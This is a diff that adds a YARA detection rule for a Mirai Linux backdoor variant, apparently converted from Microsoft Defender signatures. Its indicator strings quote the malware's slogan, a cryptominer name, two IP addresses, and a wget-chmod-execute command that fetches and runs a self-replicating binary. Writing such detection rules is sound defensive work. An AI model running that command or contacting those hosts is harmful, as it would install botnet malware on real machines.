@@ -9556,3 +9556,31 @@ rule Backdoor_Linux_Mirai_B_2147956509_0
         (5 of ($x*))
 }
 
+rule Backdoor_Linux_Mirai_PA_2147964091_0
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "Backdoor:Linux/Mirai.PA!MTB"
+        threat_id = "2147964091"
+        type = "Backdoor"
+        platform = "Linux: Linux platform"
+        family = "Mirai"
+        severity = "Critical"
+        info = "MTB: Microsoft Threat Behavior"
+        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
+        threshold = "6"
+        strings_accuracy = "High"
+    strings:
+        $x_4_1 = "iranbot init: death to israel" ascii //weight: 4
+        $x_1_2 = "iranbot.xmrig" ascii //weight: 1
+        $x_1_3 = "140.233.190.82" ascii //weight: 1
+        $x_1_4 = "82.38.4.42" ascii //weight: 1
+        $x_1_5 = "wget http://%s/iran.mipsel; chmod 777 iran.mipsel; ./iran.mipsel selfrep;" ascii //weight: 1
+    condition:
+        (filesize < 20MB) and
+        (
+            ((1 of ($x_4_*) and 2 of ($x_1_*))) or
+            (all of ($x*))
+        )
+}
+
